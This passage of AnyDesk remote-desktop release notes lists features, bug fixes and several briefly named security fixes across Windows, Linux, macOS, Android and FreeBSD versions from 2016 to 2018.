- Fixed problems which could occur when the horizontal resolution was not divisible by 16.
- Fixed a crash related to the cursor.
- Fixed a crash during registration of the first incoming session.
- Custom Client: For an incoming file transfer session AnyDesk did not check if file transfer
was set to disallowed by an override. As a result file transfer was still possible.
- Custom Client: In the security settings AnyDesk did not show if the file transfer permission
is overridden.
- Fixed a rare crash when using two main windows during installation.
- Fixed sorting using the list view header in the address book.
- Fixed filtering in the address book.
- Fixed cursor having a question mark if no mouse was plugged in, but a cursor was available.
- Fixed follow remote mouse cursor causing crashes and freezes.
06.12.2018 - 4.3.0 beta (Android)
---------------------------------
New Features
- Improved hole punching for direct connections.
- New proxy settings.
- New privacy settings.
Fixed Bugs
- Fixed missing pie menu.
- Minor bugfixes.
09.11.2018 - 4.0.1 (Linux)
--------------------------
New Features:
- Added more permissions to security settings
- Added new permission interface to backend
- Added connect to loginscreen features to rpm distros (systemd only)
- Added protocol handler for anydesk:// links
Fixed Bugs
- Fixed a bug that caused AnyDesk to grab the focus and disable window movement, etc
- Fixed many keyboard problems
- Fixed the keyboard acting weird after login
- Fixed AnyDesk displaying the wrong recording settings
- Fixed AnyDesk showing a forbidden cursor even when input is allowed
- Fixed some minor graphical glitches in the GUI
- Fixed that sometimes input was not possible on certain login screens
- Fixed a bug that caused anydesk to show a white screen after fast user switching
- Fixed the update link
- Moved the system informations into the session tab as button
- Fixed the icon not showing up on when using the debian package
12.10.2018 - 4.3.0 (macOS)
--------------------------
New Features
- Added file manager session type.
Fixed Bugs
- Fixed screenshots. They are saved on the Desktop.
- Fixed deletion of speed dial items.
22.08.2018 - 4.2.3 (Windows)
----------------------------
New Features
- Added a setting to disallow direct connections (hole punching).
Default is allowed.
Fixed Bugs
- Fixed auto-reconnect in the remote restart feature.
- Fixed a rare crash which could occur in incoming sessions.
- In some situations (for example virtual machines), no image was displayed by the
ddraw view. In this case, AnyDesk uses gdi now and displays an image.
- The standard distribution of AnyDesk did not start when a previously installed
MSI version of AnyDesk was not uninstalled correctly.
14.08.2018 - 4.0.0 (Linux)
--------------------------
New Features:
- Added Addressbook
- Added Session Commenting
- Added Session Recording and Playback
- Added new permission interface in accept window
- Changing the permissions from the remote side is now forbidden (users cannot click in
the relevant parts of the accept window anymore from the remote side).
- Added restart button on language change in the settings
Fixed Bugs
- Fixed the Action Menu beeing sensitive even if the session was not yet established
- Fixed the passwort save box beeing sensitive even if storing the password is forbidden
- Fixed that a nonsense message was displayed when connecting to an unsupported display
server (e.g. Wayland).
- Fixed several bugs related to systemd
- Made TCP Holepunching better for systems running kernel >= 3.9
- Fixed session breakdown on Ubuntu >= 18.04 when using "sudo su" in terminal
30.07.2018 - 2.9.9 (Linux)
--------------------------
Fixed Bugs
- Fixed the statusbar for active sessions
26.07.2018 - 2.9.8 (Linux)
--------------------------
Fixed Bugs
- Fixed a bug that spawned the global settings in a manner that passwords would be written to the wrong config file. Thus it was not possible to change the unattended PW in some cases
- Fixed a bug that crashed AnyDesk when entering an invalid ID
- Fixed connect via command line
- Fixed a bug that assigned a new ID when starting a local service after global was installed
- Fixed global settings not showing on Linux Mint
18.07.2018 - 4.2.2 (Windows)
----------------------------
Fixed Bugs
- An alias could not be registered in case '@ad' was not appended.
Other Changes
- On successful alias registration a hint is shown, that the user has to take
care of his alias and ID on his/her own.
17.07.2018 - 4.2.1 (Windows)
----------------------------
Fixed Bugs
- Fixed a crash which could occur after one minute when there is no mouse attached
to the system.
- Fixed packets being dumped which should only be dumped in debug mode.
- Fixed a rare crash which occured immediately after starting AnyDesk.
17.07.2018 - 2.9.7 (Linux)
--------------------------
New Features
- Added connect to login screen feature for APT based distributions (only for X11)
- Added privacy settings to be on-par with the Windows port
- Changed default path of the chatlog to Documents folder
- Changed default path for the screenshots to Pictures folder
- Changed default path for file downloads to Downloads folder
- Added chatlog and screenshot path settings
- Added choose alias panel. The user can now choose an alias like in the
Windows port.
- Added popup menu to adress (Copy invitation, Copy adress, claim alias, etc)
- Added gksu and polkit functionality to enable the global settings
- Added bring to top on chat option
Fixed Bugs
- Fixed a bug in the TreeView that could lead to undefined behaviour
- Fixed reading the /proc directory for Ubuntu based distributions
- Fixed service file for Ubuntu based distributions
- Fixed file transfer issue with files containing spaces in the filename
- Fixed a bug that could crash AnyDesk during a file transfer is some special characters were in the filename
- Fixed an issue that prevented the switch sides feature from working
- Fixed a bug that could crash the tray icon
- Fixed a bug that could crash the audio settings
- Fixed the settings window not updating correctly
- Removed unneccessary dependencies from the debian package
- Fixed the command line interface
- Fixed a bug that prevented the custom logo from beeing shown
- Fixed the tray icon not autostarting in global mode
13.07.2018 - 4.2.0 (macOS)
--------------------------
New Features
- Implemented custom context menu for AnyDesk ID (claim alias, show alias/show id,
copy address).
- Implemented claim alias feature for macOS, where the user can choose an alias.
Fixed Bugs
- During a session, the hotkeys of macOS are disabled locally so they can be
transmitted to the remote side.
- In incoming file transfer sessions, the file display on the remote side was not refreshed
when the folder contents changed. The file manager view should refresh now automatically.
- Fixed a bug in incoming file transfer sessions which did not allow to go to folders with
a name which contained a space character.
- The Command+C shortcut now works on the AnyDesk ID.
- AnyDesk now prevents macOS from going to sleep mode when there is an active session.
- Fixed a bug in the request elevation feature.
11.07.2018 - 4.2.0 (Windows)
----------------------------
New Features
- Clipboard file transfer can now be disabled in the security settings.
- The preview image can now be disabled in the privacy settings.
- Most of the edits now support 'Ctrl'+'A'.
- The session comment section can now be disabled where it appears.
Fixed Bugs
- Fixed a crash in D3D render mode.
- Fixed a crash related to the 'Follow remote mouse cursor' feature.
- Fixed a bug which made it possible to set up a password which did not meet the password
safety requirements of AnyDesk for unattended access.
- Fixed a race condition that could occur during requesting an alias.
- When pasting a file after disabling the clipboard, the file copy operation got stuck.
The file copy operation is cancelled now when clipboard sync is disabled.
- Fixed a rare bug which made AnyDesk crash immediately on startup.
09.07.2018 - 4.2.2 (Android)
----------------------------
Fixed Bugs
- Improved stability.
02.07.2018 - 4.2.0 (Android)
----------------------------
New Features
- Favourites can be set in speed dial.
- Search filter for speed dial.
- Custom Alias can be registered once in the settings.
- Showing alias and ID in speed dial menu and own address field
Fixed Bugs
- Fixed error when terminating an incoming connection.
- Audio permissions are only requested when this feature is enabled in the settings.
- Minor bugfixes.
14.06.2018 - 4.1.0 (macOS)
--------------------------
Fixed Bugs
- In some cases, the installation did not work at the first attempt. This should now
always succeed on the first entry of the admin password.
- The clipoard did not work when connecting to macOS. The clipboard should now work
in any case, including clipboard file transfer. Please click the file button at the top
of the AnyDesk window in order to receive files from the clipboard on macOS.
- Improved stability
- Removed the warning that the file is downloaded from the internet.
14.06.2018 - 2.9.6 (Linux)
--------------------------
Fixed Bugs
- Fixed connections to Windows Terminal Server.
- Fixed a problem which could lead to a crash of AnyDesk after running for several days.
- Fixed a crash when revoking control permissions.
Other Changes
- Updated Logo/Design.
12.06.2018 - 4.1.3 (Windows)
----------------------------
Fixed Bugs
- Made the session comment section multiline again.
- The disclaimer did not show up again, when it was rejected the last time AnyDesk started and has not been
changed in the meantime.
- File transfer sessions no longer transmit hotkeys.
- Fixed DLL preloading vulnerability in Windows 7 SP1.
Thanks go to Kushal Arvind Shah of Fortinet's FortiGuard Labs for reporting this vulnerability to us.
11.06.2018 - 4.1.0 (Android)
----------------------------
New Features
- Showing online states in speed dial.
- Showing AnyDesk connection state.
Fixed Bugs
- Fixed pointer position on incoming connections.
- Improved battery drain.
- Improved stability.
28.05.2018 - 4.1.2 (Windows)
----------------------------
Fixed Bugs
- Fixed a bug in the security panel which made it impossible to set a password.
- Fixed navigation to the drive selection view in file transfer mode.
28.05.2018 - 4.1.1 (Windows)
----------------------------
Fixed Bugs
- Fixed a bug which made it impossible to go up two folders in succession in file transfer mode.
- Fixed caps lock in translation keyboard mode.
16.05.2018 - 4.1.0 (Windows)
----------------------------
This is an important security release, please update as soon as possible.
Security Fixes
- Prevented DLL preloading vulnerability in Windows 7 SP1.
Thanks go to Kushal Arvind Shah of Fortinet's FortiGuard Labs for reporting this vulnerability to us.
- Updated OpenSSL library to the latest version.
Fixed Bugs
- Fixed monitor reactivation when the monitor is in sleep mode and there is an incoming connection.
- Fixed manual update link when auto-update is disabled.
- Fixed a bug that prevented further connections to a computer, if a previous connection to that computer failed.
- Fixed keyboard problems that occurred in conjunction with the right shift button.
Other Changes
- If a disclaimer has been set up, it will be shown on every change even if AnyDesk is installed already.
- Most of the edits in AnyDesk now support context menu operations (paste, cut, clear, undo).
- AnyDesk will no longer follow the remote cursor when the local user changed the tab himself.
- Improved address book update performance.
16.05.2018 - 4.0.4 (Android)
----------------------------
Fixed Bugs
- Fixed automatic language selection.
- Fixed black screen on some devices.
- Improved stability.
09.05.2018 - 4.0.2 (Android)
----------------------------
New Features
- Completely exit app when exit via back button when no connection active.
Fixed Bugs
- Changing user picture now immediately takes effect.
- Improved connection to terminal server.
- Improved reconnect on network change.
- Fixed keyboard action in password dialog.
- Improved double click.
- Improved stability.
11.04.2018 - 4.0.1 (Windows)
----------------------------
Fixed Bugs
- SAS for Windows 8 and upwards was broken due to an extension handling Terminal Server.
- On Terminal Server switching to advanced view may have resulted in a crash.
10.04.2018 - 4.0.0 (Windows)
----------------------------
New Features
- Extended support for Terminal Server:
On connecting to a terminal server the user can choose now if to connect to the console session or
a specific user. As an alternative a fully specified address can be used to directly connect to a
a specific user.
- Added file manager session type. The file manager can also be used during a normal session.
- Session recording and playback. Enable this option under "privacy" in the options tab.
- Optional auto-locking of the Windows session on AnyDesk session end.
- Follow mouse cursor feature: When activated, the monitor selection follows the remote mouse cursor.
- Auto-Update
- The user can now choose an alias.
- Client Generator: Updates can now be disabled.
Fixed Bugs
- Directly after startup the main window did not show it was active.
- The min/max/close buttons of top-level windows show the correct hover state now.
- Fixed permissions in scam warn mode when authenticated with password.
- Fixed a bug in command line parsing when AnyDesk was started from a command prompt.
- Fixed a bug which made it impossible to connect to an IP/Hostname using the command line.
- Fixed a crash in the service when there were too many sessions or network cards.
The number of AnyDesk sessions is only limited by system memory now.
- Fixed a crash on session start when using D3D.
- Added a workaround in case Windows Update broke AnyDesk audio settings.
- Fixed a crash on HDD monitor failure. Instead the HDD monitor will be disabled only.
- If AnyDesk was not installed, it might not get a connection due to a race condition.
- On remote restart it was possible to doubly reconnect resulting in session termination.
- In some cases the screensaver was permanently disabled by AnyDesk.
Other Changes
- Modernized the design of AnyDesk.
- Updated localizations
- The link in the about panel that opened the folders containing trace and config files before, now
creates and opens a folder on the desktop containing copies of the trace files. This makes it easier
for the user to send the correct files to our customer support, especially in case multiple variants
of AnyDesk are used in parallel.
- The AnyDesk ID in the main window is now selectable.
- Sending a SAS (Ctrl+Alt+Del) is now disallowed in case input is disallowed.
- Adjusting remote resolution is now disallowed in case input is disallowed.
10.04.2018 - 4.0.0 (macOS)
--------------------------
New Features
- Address Book
- Session recording and playback
- Connect to the login screen
- Full unattended access
Fixed Bugs
- Improved stability
28.03.2018 - 4.0.0 (Android)
----------------------------
New Features
- Session recording and replay.
- Picture in picture mode on Android 8.0 and later.
- Using Android wallpaper for speed dial items.
- Improved speed.
Fixed Bugs
- Improved video mode selection (fixes black screen on some devices).
- Fixed speed dial thumbnails.
- Fixed security settings.
- Fixed dialogs.
- Fixed clipboard synchronization.
- Improved stability.
27.02.2018 - 3.7.2 (Android)
----------------------------
Fixed Bugs
- Improved stability.
- Fixed black screen issue.
12.02.2018 - 3.7.0 (Android)
----------------------------
New Features
- Support for Stylus Pen
- Support for Samsung DEX Station
Fixed Bugs
- Improved stability
- Minor bugfixes
18.01.2018 - 2.9.7 (macOS)
--------------------------
Fixed Bugs
- Fixed a problem that made it impossible for AnyDesk to run on any other CPU than a Core-i
10.01.2018 - 3.7.0 (Windows)
----------------------------
Fixed Bugs
- Security change: fixed a bug where the permissions could be reset during the session.
- In some cases, the AnyDesk main window was not rendered correctly in Windows 10 (showing
transparent areas).
04.12.2017 - 3.6.2 (Android)
----------------------------
Fixed Bugs
- Improved stability
24.11.2017 - 3.6.0 (Android)
----------------------------
New Features
- Incoming connections on Android >= 5.0
- Create shortcuts on home screen.
- Rename speed dial items.
- Select user image from gallery, file browser, or camera.
- Upload of non-local files.
- Support for audio transmission.
Fixed Bugs
- Improved input via touch, soft keyboard, external mouse, and external keyboard.
- Fixed issue on Samsung devices (right mouse button closes app).
- Fixed memory leaks.
- Improved stability
17.11.2017 - 3.6.3 (Windows)
----------------------------
Fixed Bugs
- Fixed a crash when terminating AnyDesk using the tray icon while sessions were running.
- Under rare conditions, connecting to Windows 10 showed no image/a black image.
- Clipboard permission works again.
- Disallowed to change the license key if settings are disabled.
- Fixed SAS (Ctrl+Alt+Del) which did not work under some conditions on Windows Vista and upwards.
- On some Windows 10 systems, AnyDesk did not work when the monitor was rotated. On these
systems, AnyDesk should now transmit the monitor content normally.
- Fixed two rarely occuring crashes on address book close.
17.10.2017 - 3.6.2 (Windows)
----------------------------
Fixed Bugs
- Trying to add an address from the speed dial to an address book with a license of type free or lite
opened a dialog instead of the address book.
- Fixed screensaver settings on AnyDesk session close. This was broken due to a bug in Windows.
- Fixed session comment dialog which could appear twice.
- Fixed strange behaviour of custom version occuring in case a custom MSI version is installed.
This broke the clipboard for example.
Other Changes
- Made license key removal more explicit and added option 'Change license key' to the main menu.
14.09.2017 - 2.9.5 (Linux)
--------------------------
Fixed Bugs
- Fixed a problem that caused sending actions to the first connection
- Fixed some issues with the keyboard
- Fixed to send hotkeys like alt+f2 to other Linuxes
- Fixed that AnyDesk was left in fullscreen mode when the connection was closed
- Several minor bugfixes
05.09.2017 - 3.6.1 (Windows)
----------------------------
Fixed Bugs
- Important security update, fixed dll injection vulnerability. Thanks to 0x09AL for reporting this.
01.09.2017 - 3.6.0 (Windows)
----------------------------
New Features
- Transmission of system information can now be blocked. Older versions of AnyDesk will show useless information in this case.
- Added a setting to disable the chat log.
- Added a setting to choose the path to the chat log.
- Added a setting to show the address book on startup.
- Added a setting to allow the accept window to go to foreground on chat message received.
Fixed Bugs
- Fixed a crash on opening the chat log on the backend side after a session request has been canceled.
- Fixed a crash on address book request failure, for example when trying to add an already contained address.
- Fixed a bug leading to an empty list of address books in the dialog shown on trying to add an address
from the speed dial to the address book when the address book has not been opened before.
- Fixed online states of speed dial entries on startup.
- Fixed strange button behavior in the accept window.
- Fixed some dpi and other graphical issues.
Other Changes
- Improved connect mechanism when using a proxy.
- On scam warning all standard permissions are set to disallowed now (regardless of settings).
- The user-defined name of an address is now italicized.
18.08.2017 - 2.9.6 (MacOS)
--------------------------
Fixed Bugs
- Fixed some issues regarding the remote restart.
- Fixed some issues regarding the elevation.
- Several minor bug fixes.
03.08.2017 - 3.5.0 (Windows)
----------------------------
New Features
- The remote restart feature now even works when AnyDesk is not installed.
Please note: You will need to request elevation from the remote user before using the restart feature
in this case.
- Custom AnyDesk: Text and title of ID and Connect Group (Main Window) can now be customized.
- Custom AnyDesk: Before frontend startup a disclaimer can be shown now, which can be customized in
logo, title, text, background color and the text on the accept and cancel buttons. It is shown only,
if AnyDesk is not installed and the text contains non-whitespaces. All other settings are optional.
- Custom AnyDesk: Added support for environment variables in paths.
Fixed Bugs
- In the D3D fullscreen menu the keyboard mode has always been set to 'translate'.
- The invitation link in the main window has not been shown anymore after switching to advanced view and back.
- Fixed crash on opening the chat log in the backend after session close.
- Fixed crash when the session info panel was closed before the remote data was displayed.
- Fixed custom logo layout in the main window's advanced view.
- Fixed the connection panel's password edit showing clear text when disabled.
31.07.2017 - 2.9.5 (macOS)
--------------------------
Fixed Bugs
- Fixed crash when user tried to make a new connection.
21.07.2017 - 2.9.4 (Linux)
--------------------------
New Features
- Improved the notification mechanism of the Chat so the User will get better notifications of a chat message
Fixed Bugs
- Fixed weird behaviour of the chat window on some desktop environments (e.g. XFCE4)
- Fixed a small issue where files were not transmitted correctly
16.07.2017 - 2.9.4 (macOS)
--------------------------
New Features
- Request elevation dialog
- Remote restart dialog
Fixed Bugs
- Fixed crash when Mac entered sleep mode.
13.07.2017 - 3.4.1 (Windows)
----------------------------
Fixed Bugs
- Fixed dpi of comment session dialog.
- Fixed that the comment session dialog can be shown although the licence is of type Lite.
- Fixed a crash related to the comment session dialog.
- Fixed that the character right of '9' on the standard hungarian keyboard layout has not been recognized before.
11.07.2017 - 3.4.0 (Windows)
----------------------------
New Features
- Sessions can now be commented on close. The comment can then be looked up on my.anydesk.com.
If you don't want to comment, just clear the comment field. You will need a licence in order to use
this new feature. Please get an evaluation licence on http://anydesk.com/trial-licence.
- Address Book: AnyDesk now supports multiple address books. They can be added (up to a certain limit)
and deleted. The number of available address books depends on your licence.
- Status bars now also show the remote user name.
Fixed Bugs
- Fixed a crash on connecting due to monitor detection failure.
- Address Book: Fixed tag validation on rename.
- After elevation the backend user name in the chat was SYSTEM.
Other Changes
- Fixed and updated interfaces of installer, uninstaller, updater and global settings windows.
06.07.2017 - 3.3.2 (Windows)
----------------------------
Fixed Bugs
- Important security update. Please update if you have version 3.3.1.
- Fixed a crash when using the drop to desktop feature.
26.06.2017 - 3.3.1 (Windows)
----------------------------
Fixed Bugs
- Fixed a crash on connecting due to monitor detection failure.
- Fixed ACL denying access although the list is empty.
23.06.2017 - 3.3.0 (Windows)
----------------------------
New Features
- Address book: The name of an address can be set now on adding it to the address book.
- Address book: Tags can now be renamed and removed from the tag tree view directly (on the left).
Right click on a tag to choose.
- Address book: Added commands 'Expand All' and 'Collapse All' to the tag tree view.
Right click on a tag or the tag tree view itself to choose.
- Address Book: If a user action fails an error info dialog will be shown now.
- When adding an address from the speed dial to the address book, a dialog will be shown now.
- When connecting to a multi monitor system, AnyDesk now automatically switches to the primary monitor.
Fixed Bugs
- Fixed a crash after installing AnyDesk on Windows XP.
- Address book: Fixed selected tags view layout (on top).
- Fixed service crash after installation due to invalid install parameters.
- Fixed a crash on closing a session using OpenGL.
- Using the mirror driver the backend detected more monitors than physically available, in case a
software for virtual monitor creation is installed.
Other Changes
- Address Book: The list view now auto-sizes its columns.
- Most text edits now select their content on getting keyboard focus.
16.06.2017 - 2.9.3 (Linux)
--------------------------
Fixed Bugs
- Fixed a crash when using the backend filetransfer
16.06.2017 - 2.9.3 (macOS)
-------------------------
Fixed Bugs
- Fixed several minor issues
- Fixed crash after connecting
- Fixed a crash in the backend
30.05.2017 - 3.2.5 (Windows)
----------------------------
Fixed Bugs
- Fixed a crash after remote restart.
- Fixed a bug in feature availability indicator in menu.
- Fixed a bug in the address book that did not allow to add an item from the speed dial to the address
book directly after startup.
29.05.2017 - 2.9.2 (macOS)
--------------------------
Fixed Bugs
- Fixed several crashes in the frontend
- Fixed the original view mode scrolling
- Fixed a bug in the speed dial thumbnails
17.05.2017 - 3.2.4 (Windows)
----------------------------
Fixed Bugs
- Fixed a bug which allowed two dialogs to be shown at the same time.
- Fixed remote cursor rendering at the edges of the view.
- Fixed a bug which let elevation fail when Windows denied access to the AnyDesk executable.
- Fixed a bug which led to the service shutting down automatically on elevating its backend, in case
AnyDesk has not been installed on that side and the main window there has been closed before elevation.
- Fixed the action menu showing elevation was available although the backend has been elevated already.
- Fixed a race condition in the address book which made it unusable in some situations.
- Fixed a bug in feature availability indicator in menu.
Other Changes
- Added a hint in the elevation dialog that the remote user usually has to accept an elevation request.
16.05.2017 - 3.2.1 (Android)
----------------------------
New Features
- Added touchpad input mode.
Fixed Bugs
- Fixed triple click input.
- Fixed cursor rendering near borders.
- Fixed soft keyboard input on some devices (Due to a software bug in the Samsung keyboard, installing a non-Samsung keyboard might be necessary on some devices).
- Minor improvements.
12.05.2017 - 2.9.1 (FreeBSD)
----------------------------
New Features
- Added advanced view for the speed dial
- Added online states for speed dial items
- Added speed dial favorite function
- Redesign of the GUI
- Redesign of the chat
- Added single accept window with tabs
- Added chat recorder to write chat logs to disk
- Added new filetransfer to the backend to allow multiple filetransfers at the same time
- Added supress hotkeys to transmit e.g. Alt-Tab or Alt-F4 instead of executing it on the own side
- Added the remote reboot menu to reboot Windows machines
- Added the "show remote cursor" feature
- Added the Split Menu in BSD
- BSD now recognized a remote resolution change
- Added the "Adapt remote resolution" option
- Added gathering remote System informations
- Added pointing mode
- Implemented the input forbidden mouse cursor
- Improved security by implementing the input blocker (remote user cannot control the backend, also local users mouse has priority over remote users mouse)
- Added proxy support
- Added the switch sides option
- Added bidirectional file transfer
- AnyDesk now has a proper CLI Interface
- Added update information box
- Added Audio support for BSD (PulseAudio only, libpulse is needed)
- Implemented multi process architecture
- Implemented new event structure (performance)
- Added new keyboard layout (1:1 mapping, translation mode, automatic)
- Reworked GUI
- Reworked settings dialog
- Reworked accept window
- Added about dialog
- Reworked license registration
- Ability to place shortcuts to remote computers on the desktop
- Added support for transfering the wallpaper instead of a screenshot to speed dial for some desktop environments (MATE, Gnome3, Unity, Cinnamon)
- Updated OpenSSL to newest version
Other Changes
- Improved password security check. Raised minimal password length to 8 characters.
- Changed default interactive access setting: the accept Window will now only pop up
if the AnyDesk window is currently open. Unattended access with a password is still
possible at any time.
Fixed Bugs
- Fixed several minor bugs
- Fixed a bug in the audio code that could crash the backend
- Fixed a bug that stopped the image transmission because of a custom message sent by QT application that caused the capture compontent to stop
- Fixed several deadlocks
- Fixed a bug that could spam X11 and cause a complete X11 hangup
- Fixed a race condition that could crash the backend
- Fixed a bug that crashed the service when receiving SIGPIPE
- Fixed a bug that could cause an empty accept window to appear
- Fixed a bug that could deadlock the accept window
- Fixed a bug that could cause the timer to crash
- Fixed a bug in the PulseAudio code that could lead to a backend crash
- Fixed a bug in the Filetransfer where folders were not transmitted
- Fixed a bug where libpulse and libpulse-simple could not be found on some systems
- Prevent audio loopback when connected to self
- Fixed cursor image corruption
- Fixed X11 deadlocking due to a bug in libxcb
- Fixed username retrieval
- Fixed a bug in the switch sides code
- Fixed a bug where wallpapers did not get transmitted
- Improved application startup
- Fixed bugs in the input injector
- Fixed possible deadlock
- Fixed image corruption which occured with certain versions of x11
- Fixed a bug on headless machines in BSD
- Fixed a bug that caused a fuzzy mouse cursor
- Fixed a bug in the IPC
- Fixed a bug where a connection got rejected even if the frontend is opened
- Fixed a bug in the switch sides feature
- Fixed a bug that could cause the backend to crash upon quitting
- Fixed a bug that could fuzz out the main window
- Fixed a bug causing a massive lag in the keyboard translation
- Fixed deadlocks
- Fixed bug in chat
- Fixed bug in license registration
- Fixed bug that caused no direct connection
- Several minor bugfixes
11.05.2017 - 2.9.1 (Linux)
--------------------------
Fixed Bugs
- Fixed several minor bugs
- Fixed a bug that caused custom clients to crash
09.05.2017 - 3.2.3 (Windows)
----------------------------
Fixed Bugs
- Fixed a regression which impaired AnyDesk's performance severely when connected to a Windows
8, 8.1 or 10 computer. Please update!
- Fixed a bug which caused the auto-reconnect feature after a remote restart to fail when the global
settings dialog was opened previously.
- Fixed a crash when using the "Retry" button in the remote desktop access denied dialog.
- Improved stability.
Other Changes
- Improved feature availability indicator in menu.
05.05.2017 - 3.2.2 (Windows)
----------------------------
Fixed Bugs
- Fixed a bug which could lead to the service not starting timely after installing AnyDesk.
- Fixed a crash which occured when closing the address book and terminating AnyDesk.
- Fixed a crash by using ddraw as fallback for d3d when the graphics driver is not installed
correctly and causes an exception during initialization.
- Tags are validated now in the address book.
Other Changes
- Improved focus behaviour of controls.
05.05.2017 - 2.8.0 (Mac)
------------------------
New Features
- Implemented online state indicator in the speed dial.
- Incoming sessions are now displayed in tabs instead of a window for each session.
Fixed Bugs
- Fixed a bug which could lead to additional data at the end of links when copied over the clipboard.
- Improved session tab behaviour when multiple sessions are open at the same time.
- Improved stability.
Other Changes
- Implemented notification when a new version is available.
03.05.2017 - 3.2.1 (Windows)
----------------------------
Fixed Bugs
- Fixed crash on adding an address to the address book.
- Fixed elevation with credentials in case AnyDesk has been started from a user folder.
- Fixed a crash which could occur when terminating a session with an open address book or
multiple monitors.
- Fixed character keyboard input which was not working for certain programs (GTK, QT) when
connected from a mobile device.
Other Changes
- Improved prompt shown in the password dialog when connecting.
- Controls now show if focused.
27.04.2017 - 3.2.0 (Windows)
----------------------------
New Features
- The address book now remembers the last used view type (list/tiles).
- The address book now offers sorting options.
- The address book now opens the tag dialog immediately after an address has been added.
- The accept window will no longer auto-close tabs when chat messages have been sent/received.
- Sessions can now be accepted via 'Enter' and dismissed via 'Esc'.
- Added session status messages to chat.
- The session time is now shown during a session and after disconnect.
- The remote user client ID is now shown during a session (additionally to its alias).
- Your fingerprint can now be seen in the about panel.
- The password for unattended access is now controlled via a dialog.
You have to enter your password twice to check for misspellings.
- Added language auto-selection (will select system language).
Fixed Bugs
- Fixed WoA.
- Fixed elevation with credentials.
- The direct connection icon in the backend was greyed out although there was a direct connection.
- The drop link feature dropped an invalid link (name instead of address).
- After disconnect it was no longer possible to mark/copy chat messages.
- Fixed a crash that could occur on sending chat messages.
- Some chat messages have not been recorded.
- Fixed some minor bugs in the chat.
- Fixed wrong message shown in the frontend on session request rejected.
- Fixed some bugs with keyboard focus.
- Fixed a bug with auto-selection of tabs in accept window.
- Sometimes the address book did not show online states on opening it the first time.
- Fixed some bugs with tag selection in the address book.
- Fixed a crash that could occur when closing the main window with the address book opened.
- Fixed filtering of recent connections.
- Fixed recent connection being removed from favorites on name change.
- In some cases a wrong text has been shown on connection request.
- Fixed various minor bugs.
Other Changes
- The accept/dismiss buttons are now disabled for a short time when entering a new session state
to prevent accidentally clicking them.
- The accept window is now only always on top when there are not yet accepted sessions left.
And it will be back on top on session request.
- The accept window will now auto-select an incoming session tab in some situations.
- Added bottom right resize corner.
- Fixed some dpi issues.
- Added some localization.
11.04.2017 - 3.2.0 (Android)
----------------------------
New Features
- Added support for multi window mode on Android 7 and Samsung devices.
- The soft keyboard now pops up automatically when input fields are selected.
- Implemented clipboard text synchronization.
- Implemented new options.
Fixed Bugs
- Improved support for external keyboards over USB and Bluetooth.
- Fixed file transfer of empty files.
- Fixed black screen issue.
- Fixed crashes on some devices when showing remote cursor.
29.03.2017 - 2.9.0 (Linux)
--------------------------
New Features
- Added advanced view for the speed dial
- Added online states for speed dial items
- Added speed dial favorite function
- Redesign of the GUI
- Redesign of the chat
- Added single accept window with tabs
- Added chat recorder to write chat logs to disk
- Added new filetransfer to the backend to allow multiple filetransfers at the same time
- Added supress hotkeys to transmit e.g. Alt-Tab or Alt-F4 instead of executing it on the own side
Fixed Bugs
- Fixed a bug in the audio code that could crash the backend
- Fixed a bug that stopped the image transmission because of a custom message sent by QT application that caused the capture compontent to stop
- Fixed several deadlocks
- Fixed a bug that could spam X11 and cause a complete X11 hangup
- Fixed a race condition that could crash the backend
- Fixed a bug that crashed the service when receiving SIGPIPE
- Fixed a bug that could cause an empty accept window to appear
- Fixed a bug that could deadlock the accept window
- Fixed a bug that could cause the timer to crash
27.02.2017 - 2.7.3 (Android)
----------------------------
New Features
- Implemented clipboard file transfer.
Fixed Bugs
- Fixed a problem which could cause the keyboard not to work on some devices.
- Fixed an issue which could cause a black screen after pausing and resuming.
- Fixed a problem which could cause a all settings to be lost on some devices (e.g. loss of the connection history).
- Improved usability.
- Improved stability.
03.02.2017 - 2.7.1 (macOS)
--------------------------
New Features
- macOS now has a Filetransfer similar to that in Linux
- GUI enhancements
Fixed Bugs
- Fixed a bug regarding the mousecursor on retina displays
- Fixed a huge memory leak that lead to full usage of system memory when connecting to the Mac
- Fixed issues with the custom client
03.02.2017 - 2.7.1 (Linux)
--------------------------
Fixed Bugs
- Fixed a bug that made it possible to access the settings in the custom client even when the settings were disabled
- Fixed a bug in the PulseAudio code that could lead to a backend crash
- Fixed a bug in the Filetransfer where folders were not transmitted
05.01.2017 - 3.1.1 (Windows)
----------------------------
Fixed Bugs
- Improved stability
- Fixed some bugs in the chat
Other Changes
- Signed the exe and msi files with two certificates.
29.12.2016 - 3.1.0 (Windows)
----------------------------
New Features
- Reworked the chat in the client.
- Added an option to disable remote restart in the security settings.
Fixed Bugs
- Fixed a bug in DeskRT which caused it to be slow on certain monitor resolutions
indivisible by 16 (for example 1366x768). Responsiveness should be much higher
now in these cases.
- In some cases, the view mode settings for remote computers were not restored
correctly for future sessions.
- Fixed a crash which could occur when connecting to AnyDesk while it was
terminating.
- Fixed a bug which could lead to the system info feature not being available.
- Improved stability.
- Minor user interface layout fixes.
13.12.2016 - 3.0.0 (Windows)
----------------------------
New Features
- Added edge scrolling feature for the original view mode. Use this when the
remote image is much larger than the local monitor.
09.12.2016 - 2.6.1 (Linux)
--------------------------
New Features
- Added the remote reboot menu to reboot Windows machines
- Added the "show remote cursor" feature
- Added the Split Menu in Linux
- Linux now recognized a remote resolution change
- Added the "Adapt remote resolution" option
- Added gathering remote System informations
Fixed Bugs
- Fixed a bug where libpulse and libpulse-simple could not be found on some systems
- Prevent audio loopback when connected to self
- Fixed several minor bugs
01.12.2016 - 3.0.0 Beta (Windows)
---------------------------------
New Features
- Implemented an address book feature which allows online management of computers.
The address book will allow you to tag and sort items into groups.
You will need a licence in order to use this new feature. Please get an
evaluation licence on http://anydesk.com/trial-licence.
- Improved the speed dial with an advanced mode.
- The speed dial now filters the previous connections on user input.
- The speed dial and address book now show the online state of computers.
Red: Offline, Green: Online, Grey: Unknown
- Implemented favourites in the speed dial. These will also affect the
Windows jump list.
- The accept window now shows the incoming remote sessions in tabs instead
of seperate windows.
- The accept window will now stay open until it is closed by the user so
supporters can leave a chat message after giving remote support.
- Improved the chat view.
- Session settings are now saved and restored when connecting to the same remote
computer again.
- The custom client (exe and msi file) can now embed the licence key for easy
deployment.
Fixed Bugs
- Fixed a clipboard file copy bug when the user connected to a freshly started
Windows machine onto the logon screen and then logged on a user.
Other Changes
- New user interface design.
- Updated the localizations.
Security Fixes
- Added quotes to the path of the service.
28.10.2016 - 2.6.1 (Windows)
----------------------------
Fixed Bugs
- Fixed a crash which could occur when using the remote restart feature.
